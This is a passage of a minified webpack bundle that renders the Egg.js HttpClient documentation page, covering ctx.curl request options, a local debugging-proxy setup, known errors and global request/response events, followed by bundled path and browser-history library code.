content: '<xml><hello>world</hello></xml>',\n  headers: {\n    'content-type': 'text/html',\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"files-mixed"},r.a.createElement(l["AnchorLink"],{to:"#files-mixed","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"files: Mixed")),r.a.createElement("p",null,"File upload, support: ",r.a.createElement("code",null,"String | ReadStream | Buffer | Array | Object"),"."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  files: '/path/to/read',\n  data: {\n    foo: 'other fields',\n  },\n});",lang:"js"}),r.a.createElement("p",null,"upload multiple files:"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  files: {\n    file1: '/path/to/read',\n    file2: fs.createReadStream(__filename),\n    file3: Buffer.from('mock file content'),\n  },\n  data: {\n    foo: 'other fields',\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"stream-readstream"},r.a.createElement(l["AnchorLink"],{to:"#stream-readstream","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"stream: ReadStream")),r.a.createElement("p",null,"Set request context's readable stream, default ",r.a.createElement("code",null,"null"),". If the parameter is set , HttpClient will ignore ",r.a.createElement("code",null,"data")," and ",r.a.createElement("code",null,"content")),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  stream: fs.createReadStream('/path/to/read'),\n});",lang:"js"}),r.a.createElement("h3",{id:"writestream-writestream"},r.a.createElement(l["AnchorLink"],{to:"#writestream-writestream","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"writeStream: WriteStream")),r.a.createElement("p",null,"Set receive response data's writeable stream, default ",r.a.createElement("code",null,"null"),". Once the parameter is set, response ",r.a.createElement("code",null,"result.data")," is set to ",r.a.createElement("code",null,"null")," because all data are written to ",r.a.createElement("code",null,"writeStream"),"."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  writeStream: fs.createWriteStream('/path/to/store'),\n});",lang:"js"}),r.a.createElement("h3",{id:"consumewritestream-boolean"},r.a.createElement(l["AnchorLink"],{to:"#consumewritestream-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"consumeWriteStream: Boolean")),r.a.createElement("p",null,"Whether to wait for ",r.a.createElement("code",null,"writeStream")," completely finished as the response well received This parameter is not recommended to modify the default value, unless we know it's side effect are acceptable. Otherwise, the ",r.a.createElement("code",null,"writeStream")," data is likely to be incomplete."),r.a.createElement("h3",{id:"method-string"},r.a.createElement(l["AnchorLink"],{to:"#method-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"method: String")),r.a.createElement("p",null,"Set request method, default ",r.a.createElement("code",null,"GET"),". Support all ",r.a.createElement("code",null,"GET\u3001POST\u3001PUT\u3001DELETE\u3001PATCH")," and so on ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/http.html#http_http_methods"},"all HTTP methods"),"\u3002"),r.a.createElement("h3",{id:"contenttype-string"},r.a.createElement(l["AnchorLink"],{to:"#contenttype-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"contentType: String")),r.a.createElement("p",null,"Set request data format \uff0cdefault ",r.a.createElement("code",null,"undefined"),"\uff0cHttpClient will sets automatically based on the ",r.a.createElement("code",null,"data")," and ",r.a.createElement("code",null,"content")," parameters. When ",r.a.createElement("code",null,"data")," is object, the default setting would be ",r.a.createElement("code",null,"form"),". Support ",r.a.createElement("code",null,"json")," format."),r.a.createElement("p",null,"If need to send ",r.a.createElement("code",null,"data")," by JSON"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  data: {\n    foo: 'bar',\n    now: Date.now(),\n  },\n  contentType: 'json',\n});",lang:"js"}),r.a.createElement("h3",{id:"datatype-string"},r.a.createElement(l["AnchorLink"],{to:"#datatype-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"dataType: String")),r.a.createElement("p",null,"Set the response data format, default return the raw buffer formatted data without processing. Support ",r.a.createElement("code",null,"text")," and ",r.a.createElement("code",null,"json")),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: If ",r.a.createElement("code",null,"json")," is set\uff0ca ",r.a.createElement("code",null,"JSONResponseFormatError")," error would be thrown if fails to parse the response data.")),r.a.createElement(o["a"],{code:"const jsonResult = await ctx.curl(url, {\n  dataType: 'json',\n});\nconsole.log(jsonResult.data);\n\nconst htmlResult = await ctx.curl(url, {\n  dataType: 'text',\n});\nconsole.log(htmlResult.data);",lang:"js"}),r.a.createElement("h3",{id:"fixjsonctlchars-boolean"},r.a.createElement(l["AnchorLink"],{to:"#fixjsonctlchars-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"fixJSONCtlChars: Boolean")),r.a.createElement("p",null,"Whether filter the special control characters in the response data (U+0000 ~ U+001F)\uff0cdefault ",r.a.createElement("code",null,"false"),"Typically, the JSON data returned by some CGI system might contains such special control characters, which can be filter automatically by setting the parameters."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  fixJSONCtlChars: true,\n  dataType: 'json',\n});",lang:"js"}),r.a.createElement("h3",{id:"headers-object"},r.a.createElement(l["AnchorLink"],{to:"#headers-object","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"headers: Object")),r.a.createElement("p",null,"Custom request headers"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  headers: {\n    'x-foo': 'bar',\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"timeout-numberarray"},r.a.createElement(l["AnchorLink"],{to:"#timeout-numberarray","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"timeout: Number|Array")),r.a.createElement("p",null,"Timeout of request, default ",r.a.createElement("code",null,"[ 5000, 5000 ]"),", timeout of connection creation is 5s, and the timeout of receive response is 5s."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  // 3s timeout of connection creation, and the 3s timeout of receive response\n  timeout: 3000,\n});\n\nctx.curl(url, {\n  // 1s timeout of connection creation, and the 30s timeout of receive response for the responsing of larger scenarios\n  timeout: [1000, 30000],\n});",lang:"js"}),r.a.createElement("h3",{id:"agent-httpagent"},r.a.createElement(l["AnchorLink"],{to:"#agent-httpagent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"agent: HttpAgent")),r.a.createElement("p",null,"Allows to override the default HttpAgent through this parameter. If you don't want to enable KeepAlive, set this parameter to ",r.a.createElement("code",null,"false"),"."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  agent: false,\n});",lang:"js"}),r.a.createElement("h3",{id:"httpsagent-httpsagent"},r.a.createElement(l["AnchorLink"],{to:"#httpsagent-httpsagent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"httpsAgent: HttpsAgent")),r.a.createElement("p",null,"Allows to override the default HttpsAgent through this parameter. If you don't want to enable KeepAlive, set this parameter to ",r.a.createElement("code",null,"false"),"."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  httpsAgent: false,\n});",lang:"js"}),r.a.createElement("h3",{id:"auth-string"},r.a.createElement(l["AnchorLink"],{to:"#auth-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"auth: String")),r.a.createElement("p",null,"Parameter of Simple login authorization (Basic Authentication), will send the login information to the ",r.a.createElement("code",null,"Authorization")," request in clear form."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  // parameter must follow the format of `user:password`\n  auth: 'foo:bar',\n});",lang:"js"}),r.a.createElement("h3",{id:"digestauth-string"},r.a.createElement(l["AnchorLink"],{to:"#digestauth-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"digestAuth: String")),r.a.createElement("p",null,"Parameter of the Digest Authentication. If the parameter is set, it will attempt to generate the ",r.a.createElement("code",null,"Authorization")," request header for the 401 response automatically then try requesting for authorization once."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  // parameter must follow the format of `user:password`\n  digestAuth: 'foo:bar',\n});",lang:"js"}),r.a.createElement("h3",{id:"followredirect-boolean"},r.a.createElement(l["AnchorLink"],{to:"#followredirect-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"followRedirect: Boolean")),r.a.createElement("p",null,"Whether to follow 3xx redirect response, default ",r.a.createElement("code",null,"false")),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  followRedirect: true,\n});",lang:"js"}),r.a.createElement("h3",{id:"maxredirects-number"},r.a.createElement(l["AnchorLink"],{to:"#maxredirects-number","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"maxRedirects: Number")),r.a.createElement("p",null,"Set the maximum number of automatic redirects to prevent the endless redirect loop, default 10 times. The parameter should not be set too large and only works in the ",r.a.createElement("code",null,"followRedirect=true")),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  followRedirect: true,\n  // maximum allowed redirect 5 times\n  maxRedirects: 5,\n});",lang:"js"}),r.a.createElement("h3",{id:"formatredirecturl-functionfrom-to"},r.a.createElement(l["AnchorLink"],{to:"#formatredirecturl-functionfrom-to","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"formatRedirectUrl: Function(from, to)")),r.a.createElement("p",null,r.a.createElement("code",null,"formatRedirectUrl")," allow us to customize the implementation of 302\u3001301 other redirect URL splicing, default ",r.a.createElement("code",null,"url.resolve (from, to) "),"."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  formatRedirectUrl: (from, to) => {\n    // for example you can correct the redirection of wrong url here\n    if (to === '//foo/') {\n      to = '/foo';\n    }\n    return url.resolve(from, to);\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"beforerequest-functionoptions"},r.a.createElement(l["AnchorLink"],{to:"#beforerequest-functionoptions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"beforeRequest: Function(options)")),r.a.createElement("p",null,"HttpClient will attempt to invoke the ",r.a.createElement("code",null,"beforeRequest")," hook before requesting officially, allowing us to make the last modification of the request parameter here."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  beforeRequest: (options) => {\n    // For example, we can set the global request ID to facilitate log tracking\n    options.headers['x-request-id'] = uuid.v1();\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"streaming-boolean"},r.a.createElement(l["AnchorLink"],{to:"#streaming-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"streaming: Boolean")),r.a.createElement("p",null,"Whether to return the response stream directly, default ",r.a.createElement("code",null,"false"),"After enable streaming, HttpClient will return immediately after getting the response object res, At this moment ",r.a.createElement("code",null,"result.headers")," and ",r.a.createElement("code",null,"result.status")," can be read, but still cannot read the data"),r.a.createElement(o["a"],{code:"const result = await ctx.curl(url, {\n  streaming: true,\n});\n\nconsole.log(result.status, result.data);\n// result.res is a ReadStream Object\nctx.body = result.res;",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"if res is not passed to body directly, then we must consume this stream and do well in error handling.")),r.a.createElement("h3",{id:"gzip-boolean"},r.a.createElement(l["AnchorLink"],{to:"#gzip-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"gzip: Boolean")),r.a.createElement("p",null,"Whether to support gzip response format, default ",r.a.createElement("code",null,"false"),"After enable gzip, HttpClient will set ",r.a.createElement("code",null,"Accept-Encoding: gzip")," header and extract the data with ",r.a.createElement("code",null,"Content-Encoding: gzip")," response header automatically."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  gzip: true,\n});",lang:"js"}),r.a.createElement("h3",{id:"timing-boolean"},r.a.createElement(l["AnchorLink"],{to:"#timing-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"timing: Boolean")),r.a.createElement("p",null,"Whether to enable the time measurement for each phase, default ",r.a.createElement("code",null,"false"),"After enable the timing, you can get the time measurements of HTTP request (in milliseconds) from the ",r.a.createElement("code",null,"result.res.timing"),". Through these measurements, we can easily locate the slowest environment in the request, similar to the Chrome network timing."),r.a.createElement("p",null,"Measurement timing's analysis of each stage:"),r.a.createElement("ul",null,r.a.createElement("li",null,"queuing: allocating socket time consuming"),r.a.createElement("li",null,"dnslookup: DNS queries time consuming"),r.a.createElement("li",null,"connected: socket three handshake success time consuming"),r.a.createElement("li",null,"requestSent: requesting full data time consuming"),r.a.createElement("li",null,"waiting: first byte to received response time consuming"),r.a.createElement("li",null,"contentDownload: full response data time consuming")),r.a.createElement(o["a"],{code:'const result = await ctx.curl(url, {\n  timing: true,\n});\nconsole.log(result.res.timing);\n// {\n//   "queuing":29,\n//   "dnslookup":37,\n//   "connected":370,\n//   "requestSent":1001,\n//   "waiting":1833,\n//   "contentDownload":3416\n// }',lang:"js"}),r.a.createElement("h3",{id:"carejectunauthorizedpfxkeycertpassphrasecipherssecureprotocol"},r.a.createElement(l["AnchorLink"],{to:"#carejectunauthorizedpfxkeycertpassphrasecipherssecureprotocol","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ca\uff0crejectUnauthorized\uff0cpfx\uff0ckey\uff0ccert\uff0cpassphrase\uff0cciphers\uff0csecureProtocol")),r.a.createElement("p",null,"These are parameters are passed to the ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/https.html"},"HTTPS")," modules\uff0cdetails refer to ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/https.html#https_https_request_options_callback"},r.a.createElement("code",null,"https.request(options, callback)")),"\u3002"),r.a.createElement("h2",{id:"debugging-aid"},r.a.createElement(l["AnchorLink"],{to:"#debugging-aid","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Debugging Aid"),r.a.createElement("p",null,"If you want to debug the httpclient requests, just need to add below code to ",r.a.createElement("code",null,"config.local.js"),":"),r.a.createElement(o["a"],{code:"// config.local.js\nmodule.exports = () => {\n  const config = {};\n\n  // add http_proxy to httpclient\n  if (process.env.http_proxy) {\n    config.httpclient = {\n      request: {\n        enableProxy: true,\n        rejectUnauthorized: false,\n        proxy: process.env.http_proxy,\n      },\n    };\n  }\n\n  return config;\n};",lang:"js"}),r.a.createElement("p",null,"then open capture tools(such as ",r.a.createElement(l["Link"],{to:"https://www.charlesproxy.com/"},"charles")," or ",r.a.createElement(l["Link"],{to:"http://www.telerik.com/fiddler"},"fiddler"),")."),r.a.createElement("p",null,"after that, just start your application by:"),r.a.createElement(o["a"],{code:"$ http_proxy=http://127.0.0.1:8888 npm run dev",lang:"bash"}),r.a.createElement("p",null,"Then it works correctly, and all requests that go through HttpClient can be viewed in the capture tools."),r.a.createElement("h2",{id:"known-issues"},r.a.createElement(l["AnchorLink"],{to:"#known-issues","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Known Issues"),r.a.createElement("h3",{id:"connection-timeout"},r.a.createElement(l["AnchorLink"],{to:"#connection-timeout","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Connection Timeout"),r.a.createElement("ul",null,r.a.createElement("li",null,"Exception: ",r.a.createElement("code",null,"ConnectionTimeoutError")),r.a.createElement("li",null,"Scene: usually occurred by the DNS query is slow, or the network is slow between the client and server"),r.a.createElement("li",null,"Troubleshooting Suggestion: increase the ",r.a.createElement("code",null,"timeout")," parameter appropriately.")),r.a.createElement("h3",{id:"service-response-timeout"},r.a.createElement(l["AnchorLink"],{to:"#service-response-timeout","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service Response Timeout"),r.a.createElement("ul",null,r.a.createElement("li",null,"Exception: ",r.a.createElement("code",null,"ResponseTimeoutError")),r.a.createElement("li",null,"Scene: usually occurred by network is slower between the client and server, and happens when the data is relatively large."),r.a.createElement("li",null,"Troubleshooting Suggestion: increase the ",r.a.createElement("code",null,"timeout")," parameter appropriately.")),r.a.createElement("h3",{id:"service-disconnect"},r.a.createElement(l["AnchorLink"],{to:"#service-disconnect","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service Disconnect"),r.a.createElement("ul",null,r.a.createElement("li",null,"Exception: ",r.a.createElement("code",null,"ResponseError, code: ECONNRESET")),r.a.createElement("li",null,"Scene: usually the server actively disconnects the socket connection, causing the HTTP request link exceptions."),r.a.createElement("li",null,"Troubleshooting Suggestion: please check if server has network exception at that time")),r.a.createElement("h3",{id:"service-is-unreachable"},r.a.createElement(l["AnchorLink"],{to:"#service-is-unreachable","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service is Unreachable"),r.a.createElement("ul",null,r.a.createElement("li",null,"Exception: ",r.a.createElement("code",null,"RequestError, code: ECONNREFUSED, status: -1")),r.a.createElement("li",null,"Scene: usually because the requested URL which attached IP or the port cannot connect successfully."),r.a.createElement("li",null,"Troubleshooting Suggestion: make sure the IP or port is set correctly")),r.a.createElement("h3",{id:"domain-name-is-not-existing"},r.a.createElement(l["AnchorLink"],{to:"#domain-name-is-not-existing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Domain Name is Not Existing"),r.a.createElement("ul",null,r.a.createElement("li",null,"Exception: ",r.a.createElement("code",null,"RequestError, code: ENOTFOUND, status: -1")),r.a.createElement("li",null,"Scene: usually the domain name requested by URL cannot be resolved by DNS successfully."),r.a.createElement("li",null,"Troubleshooting Suggestion: make sure the domain name exists, and also check to see if the DNS service is properly configured.")),r.a.createElement("h3",{id:"json-response-data-format-error"},r.a.createElement(l["AnchorLink"],{to:"#json-response-data-format-error","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"JSON Response Data Format Error"),r.a.createElement("ul",null,r.a.createElement("li",null,"Exception: ",r.a.createElement("code",null,"JSONResponseFormatError")),r.a.createElement("li",null,"scene: the ",r.a.createElement("code",null,"dataType=json")," is set and this exception is thrown in response data that does not match JSON format."),r.a.createElement("li",null,"Troubleshooting Suggestion: make sure that the server no matter what situations are returns the data in JSON format correctly.")),r.a.createElement("h2",{id:"global-request-and-response-events"},r.a.createElement(l["AnchorLink"],{to:"#global-request-and-response-events","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Global ",r.a.createElement("code",null,"request")," and ",r.a.createElement("code",null,"response")," Events"),r.a.createElement("p",null,"In enterprise application scenarios, generally a unified tracer log is needed. To facilitate monitoring HttpClient requests and responses on the app level, we agreed on global ",r.a.createElement("code",null,"request")," and ",r.a.createElement("code",null,"response")," to expose these two events."),r.a.createElement(o["a"],{code:"init options\n        |\n        V\n    emit `request` event\n        |\n        V\n    send request and receive response\n        |\n        V\n    emit `response` event\n        |\n        V\n       end",lang:"bash"}),r.a.createElement("h3",{id:"request-event-occurs-before-the-network-operation"},r.a.createElement(l["AnchorLink"],{to:"#request-event-occurs-before-the-network-operation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"request")," Event Occurs before the Network Operation"),r.a.createElement("p",null,"A ",r.a.createElement("code",null,"request")," event is triggered before the request is sent, allowing blocking of the request."),r.a.createElement(o["a"],{code:"app.httpclient.on('request', (req) => {\n  req.url; //request url\n  req.ctx; //context of the request\n\n  // you can set some trace headers here for full link tracking propose\n});",lang:"js"}),r.a.createElement("h3",{id:"response-event-occurs-after-the-end-of-network-operation"},r.a.createElement(l["AnchorLink"],{to:"#response-event-occurs-after-the-end-of-network-operation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"response")," Event Occurs after the End of Network Operation"),r.a.createElement("p",null,"After the end of request, a ",r.a.createElement("code",null,"response")," event is triggered, so that the external event can be subscribed to the log printing."),r.a.createElement(o["a"],{code:"app.httpclient.on('response', (result) => {\n  result.res.status;\n  result.ctx; //context of the request\n  result.req; //the corresponding req object, which the req in the request event\n});",lang:"js"}),r.a.createElement("h2",{id:"example"},r.a.createElement(l["AnchorLink"],{to:"#example","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Example"),r.a.createElement("p",null,"Full examples can be found on ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/blob/master/httpclient"},"eggjs/examples/httpclient")," .")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},AAg8:function(e,t,n){var a=n("oyD1"),r=n("TYe2");e.exports=function(e){var t=r(e);if("function"!=typeof t)throw TypeError(String(e)+" is not iterable");return a(t.call(e))}},ACiY:function(e,t,n){(function(e){function n(e,t){for(var n=0,a=e.length-1;a>=0;a--){var r=e[a];"."===r?e.splice(a,1):".."===r?(e.splice(a,1),n++):n&&(e.splice(a,1),n--)}if(t)for(;n--;n)e.unshift("..");return e}function a(e){"string"!==typeof e&&(e+="");var t,n=0,a=-1,r=!0;for(t=e.length-1;t>=0;--t)if(47===e.charCodeAt(t)){if(!r){n=t+1;break}}else-1===a&&(r=!1,a=t+1);return-1===a?"":e.slice(n,a)}function r(e,t){if(e.filter)return e.filter(t);for(var n=[],a=0;a<e.length;a++)t(e[a],a,e)&&n.push(e[a]);return n}t.resolve=function(){for(var t="",a=!1,l=arguments.length-1;l>=-1&&!a;l--){var o=l>=0?arguments[l]:e.cwd();if("string"!==typeof o)throw new TypeError("Arguments to path.resolve must be strings");o&&(t=o+"/"+t,a="/"===o.charAt(0))}return t=n(r(t.split("/"),(function(e){return!!e})),!a).join("/"),(a?"/":"")+t||"."},t.normalize=function(e){var a=t.isAbsolute(e),o="/"===l(e,-1);return e=n(r(e.split("/"),(function(e){return!!e})),!a).join("/"),e||a||(e="."),e&&o&&(e+="/"),(a?"/":"")+e},t.isAbsolute=function(e){return"/"===e.charAt(0)},t.join=function(){var e=Array.prototype.slice.call(arguments,0);return t.normalize(r(e,(function(e,t){if("string"!==typeof e)throw new TypeError("Arguments to path.join must be strings");return e})).join("/"))},t.relative=function(e,n){function a(e){for(var t=0;t<e.length;t++)if(""!==e[t])break;for(var n=e.length-1;n>=0;n--)if(""!==e[n])break;return t>n?[]:e.slice(t,n-t+1)}e=t.resolve(e).substr(1),n=t.resolve(n).substr(1);for(var r=a(e.split("/")),l=a(n.split("/")),o=Math.min(r.length,l.length),i=o,c=0;c<o;c++)if(r[c]!==l[c]){i=c;break}var s=[];for(c=i;c<r.length;c++)s.push("..");return s=s.concat(l.slice(i)),s.join("/")},t.sep="/",t.delimiter=":",t.dirname=function(e){if("string"!==typeof e&&(e+=""),0===e.length)return".";for(var t=e.charCodeAt(0),n=47===t,a=-1,r=!0,l=e.length-1;l>=1;--l)if(t=e.charCodeAt(l),47===t){if(!r){a=l;break}}else r=!1;return-1===a?n?"/":".":n&&1===a?"/":e.slice(0,a)},t.basename=function(e,t){var n=a(e);return t&&n.substr(-1*t.length)===t&&(n=n.substr(0,n.length-t.length)),n},t.extname=function(e){"string"!==typeof e&&(e+="");for(var t=-1,n=0,a=-1,r=!0,l=0,o=e.length-1;o>=0;--o){var i=e.charCodeAt(o);if(47!==i)-1===a&&(r=!1,a=o+1),46===i?-1===t?t=o:1!==l&&(l=1):-1!==t&&(l=-1);else if(!r){n=o+1;break}}return-1===t||-1===a||0===l||1===l&&t===a-1&&t===n+1?"":e.slice(t,a)};var l="b"==="ab".substr(-1)?function(e,t,n){return e.substr(t,n)}:function(e,t,n){return t<0&&(t=e.length+t),e.substr(t,n)}}).call(this,n("B0ME"))},AFTV:function(e,t,n){"use strict";n.d(t,"a",(function(){return P})),n.d(t,"b",(function(){return U})),n.d(t,"d",(function(){return H})),n.d(t,"c",(function(){return k})),n.d(t,"f",(function(){return w})),n.d(t,"e",(function(){return y}));var a=n("2EJr");function r(e){return"/"===e.charAt(0)}function l(e,t){for(var n=t,a=n+1,r=e.length;a<r;n+=1,a+=1)e[n]=e[a];e.pop()}function o(e,t){void 0===t&&(t="");var n,a=e&&e.split("/")||[],o=t&&t.split("/")||[],i=e&&r(e),c=t&&r(t),s=i||c;if(e&&r(e)?o=a:a.length&&(o.pop(),o=o.concat(a)),!o.length)return"/";if(o.length){var u=o[o.length-1];n="."===u||".."===u||""===u}else n=!1;for(var d=0,m=o.length;m>=0;m--){var p=o[m];"."===p?l(o,m):".."===p?(l(o,m),d++):d&&(l(o,m),d--)}if(!s)for(;d--;d)o.unshift("..");!s||""===o[0]||o[0]&&r(o[0])||o.unshift("");var h=o.join("/");return n&&"/"!==h.substr(-1)&&(h+="/"),h}var i=o;function c(e){return e.valueOf?e.valueOf():Object.prototype.valueOf.call(e)}function s(e,t){if(e===t)return!0;if(null==e||null==t)return!1;if(Array.isArray(e))return Array.isArray(t)&&e.length===t.length&&e.every((function(e,n){return s(e,t[n])}));if("object"===typeof e||"object"===typeof t){var n=c(e),a=c(t);return n!==e||a!==t?s(n,a):Object.keys(Object.assign({},e,t)).every((function(n){return s(e[n],t[n])}))}return!1}var u=s,d=n("/cIH"),m=n.n(d),p=n("XL89");function h(e){return"/"===e.charAt(0)?e:"/"+e}function g(e){return"/"===e.charAt(0)?e.substr(1):e}function f(e,t){return 0===e.toLowerCase().indexOf(t.toLowerCase())&&-1!=="/?#".indexOf(e.charAt(t.length))}function E(e,t){return f(e,t)?e.substr(t.length):e}function b(e){return"/"===e.charAt(e.length-1)?e.slice(0,-1):e}function v(e){var t=e||"/",n="",a="",r=t.indexOf("#");-1!==r&&(a=t.substr(r),t=t.substr(0,r));var l=t.indexOf("?");return-1!==l&&(n=t.substr(l),t=t.substr(0,l)),{pathname:t,search:"?"===n?"":n,hash:"#"===a?"":a}}function y(e){var t=e.pathname,n=e.search,a=e.hash,r=t||"/";return n&&"?"!==n&&(r+="?"===n.charAt(0)?n:"?"+n),a&&"#"!==a&&(r+="#"===a.charAt(0)?a:"#"+a),r}function k(e,t,n,r){var l;"string"===typeof e?(l=v(e),l.query=l.search?m.a.parse(l.search):{},l.state=t):(l=Object(a["a"])({},e),void 0===l.pathname&&(l.pathname=""),l.search?("?"!==l.search.charAt(0)&&(l.search="?"+l.search),l.query=m.a.parse(l.search)):(l.search=l.query?m.a.stringify(l.query):"",l.query=l.query||{}),l.hash?"#"!==l.hash.charAt(0)&&(l.hash="#"+l.hash):l.hash="",void 0!==t&&void 0===l.state&&(l.state=t));try{l.pathname=decodeURI(l.pathname)}catch(o){throw o instanceof URIError?new URIError('Pathname "'+l.pathname+'" could not be decoded. This is likely caused by an invalid percent-encoding.'):o}return n&&(l.key=n),r?l.pathname?"/"!==l.pathname.charAt(0)&&(l.pathname=i(l.pathname,r.pathname)):l.pathname=r.pathname:l.pathname||(l.pathname="/"),l}function w(e,t){return e.pathname===t.pathname&&e.search===t.search&&e.hash===t.hash&&e.key===t.key&&u(e.state,t.state)}function x(){var e=null;function t(t){return e=t,function(){e===t&&(e=null)}}function n(t,n,a,r){if(null!=e){var l="function"===typeof e?e(t,n):e;"string"===typeof l?"function"===typeof a?a(l,r):r(!0):r(!1!==l)}else r(!0)}var a=[];function r(e){var t=!0;function n(){t&&e.apply(void 0,arguments)}return a.push(n),function(){t=!1,a=a.filter((function(e){return e!==n}))}}function l(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];a.forEach((function(e){return e.apply(void 0,t)}))}return{setPrompt:t,confirmTransitionTo:n,appendListener:r,notifyListeners:l}}var j=!("undefined"===typeof window||!window.document||!window.document.createElement);function S(e,t){t(window.confirm(e))}function C(){var e=window.navigator.userAgent;return(-1===e.indexOf("Android 2.")&&-1===e.indexOf("Android 4.0")||-1===e.indexOf("Mobile Safari")||-1!==e.indexOf("Chrome")||-1!==e.indexOf("Windows Phone"))&&(window.history&&"pushState"in window.history)}function A(){return-1===window.navigator.userAgent.indexOf("Trident")}function L(){return-1===window.navigator.userAgent.indexOf("Firefox")}function T(e){return void 0===e.state&&-1===navigator.userAgent.indexOf("CriOS")}var N="popstate",O="hashchange";function I(){try{return window.history.state||{}}catch(e){return{}}}function P(e){void 0===e&&(e={}),j||Object(p["a"])(!1);var t=window.history,n=C(),r=!A(),l=e,o=l.forceRefresh,i=void 0!==o&&o,c=l.getUserConfirmation,s=void 0===c?S:c,u=l.keyLength,d=void 0===u?6:u,m=e.basename?b(h(e.basename)):"";function g(e){var t=e||{},n=t.key,a=t.state,r=window.location,l=r.pathname,o=r.search,i=r.hash,c=l+o+i;return m&&(c=E(c,m)),k(c,a,n)}function f(){return Math.random().toString(36).substr(2,d)}var v=x();function w(e){Object(a["a"])(K,e),K.length=t.length,v.notifyListeners(K.location,K.action)}function L(e){T(e)||_(g(e.state))}function P(){_(g(I()))}var R=!1;function _(e){if(R)R=!1,w();else{var 